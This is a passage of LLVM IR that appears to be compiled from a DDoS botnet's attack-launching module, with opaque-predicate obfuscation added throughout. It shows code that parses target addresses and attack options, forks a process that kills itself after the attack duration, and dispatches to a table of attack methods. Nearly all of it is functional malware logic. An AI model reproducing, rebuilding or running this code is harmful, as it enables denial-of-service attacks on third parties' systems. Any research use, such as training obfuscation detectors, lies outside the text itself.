  %205 = or i1 %203, %204
  br i1 %205, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %197
  %206 = load i8, i8* %17, align 1
  %207 = zext i8 %206 to i64
  %208 = call noalias i8* @calloc(i64 %207, i64 16) #6
  %209 = bitcast i8* %208 to %struct.attack_option*
  store %struct.attack_option* %209, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  %210 = load i32, i32* @x.5
  %211 = load i32, i32* @y.6
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %218

; <label>:218:                                    ; preds = %originalBBpart248, %originalBBpart222
  %219 = load i32, i32* %13, align 4
  %220 = load i8, i8* %17, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp slt i32 %219, %221
  br i1 %222, label %223, label %338

; <label>:223:                                    ; preds = %218
  %224 = load i32, i32* %12, align 4
  %225 = sext i32 %224 to i64
  %226 = icmp ult i64 %225, 1
  br i1 %226, label %227, label %244

; <label>:227:                                    ; preds = %223
  %228 = load i32, i32* @x.5
  %229 = load i32, i32* @y.6
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %227
  %236 = load i32, i32* @x.5
  %237 = load i32, i32* @y.6
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br label %347

; <label>:244:                                    ; preds = %223
  %245 = load i8*, i8** %11, align 8
  %246 = getelementptr inbounds i8, i8* %245, i32 1
  store i8* %246, i8** %11, align 8
  %247 = load i8, i8* %245, align 1
  %248 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %249 = load i32, i32* %13, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %251, i32 0, i32 1
  store i8 %247, i8* %252, align 8
  %253 = load i32, i32* %12, align 4
  %254 = sext i32 %253 to i64
  %255 = sub i64 %254, 1
  %256 = trunc i64 %255 to i32
  store i32 %256, i32* %12, align 4
  %257 = load i32, i32* %12, align 4
  %258 = sext i32 %257 to i64
  %259 = icmp ult i64 %258, 1
  br i1 %259, label %260, label %277

; <label>:260:                                    ; preds = %244
  %261 = load i32, i32* @x.5
  %262 = load i32, i32* @y.6
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %260
  %269 = load i32, i32* @x.5
  %270 = load i32, i32* @y.6
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %347

; <label>:277:                                    ; preds = %244
  %278 = load i8*, i8** %11, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %11, align 8
  %280 = load i8, i8* %278, align 1
  store i8 %280, i8* %20, align 1
  %281 = load i32, i32* %12, align 4
  %282 = sext i32 %281 to i64
  %283 = sub i64 %282, 1
  %284 = trunc i64 %283 to i32
  store i32 %284, i32* %12, align 4
  %285 = load i32, i32* %12, align 4
  %286 = load i8, i8* %20, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp slt i32 %285, %287
  br i1 %288, label %289, label %290

; <label>:289:                                    ; preds = %277
  br label %347

; <label>:290:                                    ; preds = %277
  %291 = load i8, i8* %20, align 1
  %292 = zext i8 %291 to i32
  %293 = add nsw i32 %292, 1
  %294 = sext i32 %293 to i64
  %295 = call noalias i8* @calloc(i64 %294, i64 1) #6
  %296 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %297 = load i32, i32* %13, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %299, i32 0, i32 0
  store i8* %295, i8** %300, align 8
  %301 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %302 = load i32, i32* %13, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %304, i32 0, i32 0
  %306 = load i8*, i8** %305, align 8
  %307 = load i8*, i8** %11, align 8
  %308 = load i8, i8* %20, align 1
  %309 = zext i8 %308 to i32
  call void @util_memcpy(i8* %306, i8* %307, i32 %309)
  %310 = load i8, i8* %20, align 1
  %311 = zext i8 %310 to i32
  %312 = load i8*, i8** %11, align 8
  %313 = sext i32 %311 to i64
  %314 = getelementptr inbounds i8, i8* %312, i64 %313
  store i8* %314, i8** %11, align 8
  %315 = load i8, i8* %20, align 1
  %316 = zext i8 %315 to i32
  %317 = load i32, i32* %12, align 4
  %318 = sub nsw i32 %317, %316
  store i32 %318, i32* %12, align 4
  br label %319

; <label>:319:                                    ; preds = %290
  %320 = load i32, i32* @x.5
  %321 = load i32, i32* @y.6
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %319
  %328 = load i32, i32* %13, align 4
  %329 = add nsw i32 %328, 1
  store i32 %329, i32* %13, align 4
  %330 = load i32, i32* @x.5
  %331 = load i32, i32* @y.6
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart248, label %originalBB32alteredBB

originalBBpart248:                                ; preds = %originalBB32
  br label %218

; <label>:338:                                    ; preds = %218
  br label %339

; <label>:339:                                    ; preds = %338, %186
  %340 = call i32* @__errno_location() #7
  store i32 0, i32* %340, align 4
  %341 = load i32, i32* %14, align 4
  %342 = load i8, i8* %15, align 1
  %343 = load i8, i8* %16, align 1
  %344 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %345 = load i8, i8* %17, align 1
  %346 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  call void @attack_start(i32 %341, i8 zeroext %342, i8 zeroext %343, %struct.attack_target* %344, i8 zeroext %345, %struct.attack_option* %346)
  br label %347

; <label>:347:                                    ; preds = %339, %289, %originalBBpart230, %originalBBpart226, %originalBBpart218, %93, %69, %57, %46, %32
  %348 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %349 = icmp ne %struct.attack_target* %348, null
  br i1 %349, label %350, label %369

; <label>:350:                                    ; preds = %347
  %351 = load i32, i32* @x.5
  %352 = load i32, i32* @y.6
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %350
  %359 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %360 = bitcast %struct.attack_target* %359 to i8*
  call void @free(i8* %360) #6
  %361 = load i32, i32* @x.5
  %362 = load i32, i32* @y.6
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %369

; <label>:369:                                    ; preds = %originalBBpart252, %347
  %370 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %371 = icmp ne %struct.attack_option* %370, null
  br i1 %371, label %372, label %392

; <label>:372:                                    ; preds = %369
  %373 = load i32, i32* @x.5
  %374 = load i32, i32* @y.6
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %372
  %381 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %382 = load i8, i8* %17, align 1
  %383 = zext i8 %382 to i32
  call void @free_opts(%struct.attack_option* %381, i32 %383)
  %384 = load i32, i32* @x.5
  %385 = load i32, i32* @y.6
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %392

; <label>:392:                                    ; preds = %originalBBpart256, %369
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %393 = alloca i8*, align 8
  %394 = alloca i32, align 4
  %395 = alloca i32, align 4
  %396 = alloca i32, align 4
  %397 = alloca i8, align 1
  %398 = alloca i8, align 1
  %399 = alloca i8, align 1
  %400 = alloca %struct.attack_target*, align 8
  %401 = alloca %struct.attack_option*, align 8
  %402 = alloca i8, align 1
  store i8* %0, i8** %393, align 8
  store i32 %1, i32* %394, align 4
  store %struct.attack_target* null, %struct.attack_target** %400, align 8
  store %struct.attack_option* null, %struct.attack_option** %401, align 8
  %403 = load i32, i32* %394, align 4
  %404 = sext i32 %403 to i64
  %405 = icmp ult i64 %404, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %406 = load i32, i32* %12, align 4
  %407 = sext i32 %406 to i64
  %408 = load i8, i8* %16, align 1
  %409 = zext i8 %408 to i64
  %_ = shl i64 5, %409
  %_2 = shl i64 5, %409
  %_3 = sub i64 0, 5
  %gen = add i64 %_3, %409
  %410 = mul i64 5, %409
  %411 = icmp ult i64 %407, %410
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %104
  %412 = load i8*, i8** %11, align 8
  %413 = bitcast i8* %412 to i32*
  %414 = load i32, i32* %413, align 4
  %415 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %416 = load i32, i32* %13, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 1
  store i32 %414, i32* %419, align 4
  %420 = load i8*, i8** %11, align 8
  %421 = getelementptr inbounds i8, i8* %420, i64 4
  store i8* %421, i8** %11, align 8
  %422 = load i8*, i8** %11, align 8
  %423 = getelementptr inbounds i8, i8* %422, i32 1
  store i8* %423, i8** %11, align 8
  %424 = load i8, i8* %422, align 1
  %425 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %426 = load i32, i32* %13, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i64 %427
  %429 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i32 0, i32 2
  store i8 %424, i8* %429, align 4
  %430 = load i32, i32* %12, align 4
  %431 = sext i32 %430 to i64
  %_8 = sub i64 0, %431
  %gen9 = add i64 %_8, 5
  %_10 = shl i64 %431, 5
  %_11 = sub i64 0, %431
  %gen12 = add i64 %_11, 5
  %432 = sub i64 %431, 5
  %433 = trunc i64 %432 to i32
  store i32 %433, i32* %12, align 4
  %434 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %435 = load i32, i32* %13, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %438, i32 0, i32 0
  store i16 2, i16* %439, align 4
  %440 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %441 = load i32, i32* %13, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i32 0, i32 1
  %445 = load i32, i32* %444, align 4
  %446 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %447 = load i32, i32* %13, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %449, i32 0, i32 0
  %451 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %450, i32 0, i32 2
  %452 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %451, i32 0, i32 0
  store i32 %445, i32* %452, align 4
  br label %originalBB7

originalBB16alteredBB:                            ; preds = %originalBB16, %169
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %197
  %453 = load i8, i8* %17, align 1
  %454 = zext i8 %453 to i64
  %455 = call noalias i8* @calloc(i64 %454, i64 16) #6
  %456 = bitcast i8* %455 to %struct.attack_option*
  store %struct.attack_option* %456, %struct.attack_option** %19, align 8
  store i32 0, i32* %13, align 4
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %227
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %260
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %319
  %457 = load i32, i32* %13, align 4
  %_33 = sub i32 %457, 1
  %gen34 = mul i32 %_33, 1
  %_35 = sub i32 0, %457
  %gen36 = add i32 %_35, 1
  %_37 = sub i32 %457, 1
  %gen38 = mul i32 %_37, 1
  %_39 = sub i32 0, %457
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 %457, 1
  %gen42 = mul i32 %_41, 1
  %_43 = sub i32 0, %457
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 %457, 1
  %gen46 = mul i32 %_45, 1
  %458 = add nsw i32 %457, 1
  store i32 %458, i32* %13, align 4
  br label %originalBB32

originalBB50alteredBB:                            ; preds = %originalBB50, %350
  %459 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %460 = bitcast %struct.attack_target* %459 to i8*
  call void @free(i8* %460) #6
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %372
  %461 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %462 = load i8, i8* %17, align 1
  %463 = zext i8 %462 to i32
  call void @free_opts(%struct.attack_option* %461, i32 %463)
  br label %originalBB54
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = load i32, i32* @x.7
  %8 = load i32, i32* @y.8
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca i8, align 1
  %20 = alloca %struct.attack_option*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i8 %1, i8* %16, align 1
  store i8 %2, i8* %17, align 1
  store %struct.attack_target* %3, %struct.attack_target** %18, align 8
  store i8 %4, i8* %19, align 1
  store %struct.attack_option* %5, %struct.attack_option** %20, align 8
  %24 = call i32 @fork() #6
  store i32 %24, i32* %21, align 4
  %25 = load i32, i32* %21, align 4
  %26 = icmp eq i32 %25, -1
  %27 = load i32, i32* @x.7
  %28 = load i32, i32* @y.8
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %38, label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %21, align 4
  %37 = icmp sgt i32 %36, 0
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %35, %originalBBpart2
  ret void

; <label>:39:                                     ; preds = %35
  %40 = call i32 @fork() #6
  store i32 %40, i32* %22, align 4
  %41 = load i32, i32* %22, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %60

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* @x.7
  %45 = load i32, i32* @y.8
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  call void @exit(i32 0) #8
  %52 = load i32, i32* @x.7
  %53 = load i32, i32* @y.8
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:60:                                     ; preds = %39
  %61 = load i32, i32* %22, align 4
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %68

; <label>:63:                                     ; preds = %60
  %64 = load i32, i32* %15, align 4
  %65 = call i32 @sleep(i32 %64)
  %66 = call i32 @getppid() #6
  %67 = call i32 @kill(i32 %66, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:68:                                     ; preds = %60
  store i32 0, i32* %23, align 4
  br label %69

; <label>:69:                                     ; preds = %originalBBpart217, %68
  %70 = load i32, i32* %23, align 4
  %71 = load i8, i8* @methods_len, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %70, %72
  br i1 %73, label %74, label %134

; <label>:74:                                     ; preds = %69
  %75 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %76 = load i32, i32* %23, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %75, i64 %77
  %79 = load %struct.attack_method*, %struct.attack_method** %78, align 8
  %80 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %79, i32 0, i32 1
  %81 = load i8, i8* %80, align 8
  %82 = zext i8 %81 to i32
  %83 = load i8, i8* %16, align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %82, %84
  br i1 %85, label %86, label %114

; <label>:86:                                     ; preds = %74
  %87 = load i32, i32* @x.7
  %88 = load i32, i32* @y.8
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %96 = load i32, i32* %23, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %95, i64 %97
  %99 = load %struct.attack_method*, %struct.attack_method** %98, align 8
  %100 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %99, i32 0, i32 0
  %101 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %100, align 8
  %102 = load i8, i8* %17, align 1
  %103 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %104 = load i8, i8* %19, align 1
  %105 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %101(i8 zeroext %102, %struct.attack_target* %103, i8 zeroext %104, %struct.attack_option* %105)
  %106 = load i32, i32* @x.7
  %107 = load i32, i32* @y.8
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %134

; <label>:114:                                    ; preds = %74
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = load i32, i32* @x.7
  %117 = load i32, i32* @y.8
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* %23, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %23, align 4
  %126 = load i32, i32* @x.7
  %127 = load i32, i32* @y.8
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart217, label %originalBB10alteredBB

originalBBpart217:                                ; preds = %originalBB10
  br label %69

; <label>:134:                                    ; preds = %originalBBpart28, %69
  call void @exit(i32 0) #8
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %6
  %135 = alloca i32, align 4
  %136 = alloca i8, align 1
  %137 = alloca i8, align 1
  %138 = alloca %struct.attack_target*, align 8
  %139 = alloca i8, align 1
  %140 = alloca %struct.attack_option*, align 8
  %141 = alloca i32, align 4
  %142 = alloca i32, align 4
  %143 = alloca i32, align 4
  store i32 %0, i32* %135, align 4
  store i8 %1, i8* %136, align 1
  store i8 %2, i8* %137, align 1
  store %struct.attack_target* %3, %struct.attack_target** %138, align 8
  store i8 %4, i8* %139, align 1
  store %struct.attack_option* %5, %struct.attack_option** %140, align 8
  %144 = call i32 @fork() #6
  store i32 %144, i32* %141, align 4
  %145 = load i32, i32* %141, align 4
  %146 = icmp eq i32 %145, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  call void @exit(i32 0) #8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %147 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %148 = load i32, i32* %23, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %147, i64 %149
  %151 = load %struct.attack_method*, %struct.attack_method** %150, align 8
  %152 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %151, i32 0, i32 0
  %153 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %152, align 8
  %154 = load i8, i8* %17, align 1
  %155 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %156 = load i8, i8* %19, align 1
  %157 = load %struct.attack_option*, %struct.attack_option** %20, align 8
  call void %153(i8 zeroext %154, %struct.attack_target* %155, i8 zeroext %156, %struct.attack_option* %157)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %158 = load i32, i32* %23, align 4
  %_ = shl i32 %158, 1
  %_11 = sub i32 0, %158
  %gen = add i32 %_11, 1
  %_12 = shl i32 %158, 1
  %_13 = shl i32 %158, 1
  %_14 = sub i32 %158, 1
  %gen15 = mul i32 %_14, 1
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %23, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %25

; <label>:8:                                      ; preds = %2
  %9 = load i32, i32* @x.9
  %10 = load i32, i32* @y.10
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* @x.9
  %18 = load i32, i32* @y.10
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %116

; <label>:25:                                     ; preds = %2
  store i32 0, i32* %5, align 4
  br label %26

; <label>:26:                                     ; preds = %originalBBpart221, %25
  %27 = load i32, i32* @x.9
  %28 = load i32, i32* @y.10
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp slt i32 %35, %36
  %38 = load i32, i32* @x.9
  %39 = load i32, i32* @y.10
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %37, label %46, label %113

; <label>:46:                                     ; preds = %originalBBpart24
  %47 = load i32, i32* @x.9
  %48 = load i32, i32* @y.10
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  %55 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %55, i64 %57
  %59 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %58, i32 0, i32 0
  %60 = load i8*, i8** %59, align 8
  %61 = icmp ne i8* %60, null
  %62 = load i32, i32* @x.9
  %63 = load i32, i32* @y.10
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %61, label %70, label %77

; <label>:70:                                     ; preds = %originalBBpart28
  %71 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %72 = load i32, i32* %5, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %71, i64 %73
  %75 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  call void @free(i8* %76) #6
  br label %77

; <label>:77:                                     ; preds = %70, %originalBBpart28
  %78 = load i32, i32* @x.9
  %79 = load i32, i32* @y.10
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %77
  %86 = load i32, i32* @x.9
  %87 = load i32, i32* @y.10
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %94

; <label>:94:                                     ; preds = %originalBBpart212
  %95 = load i32, i32* @x.9
  %96 = load i32, i32* @y.10
  %97 = sub i32 %95, 1
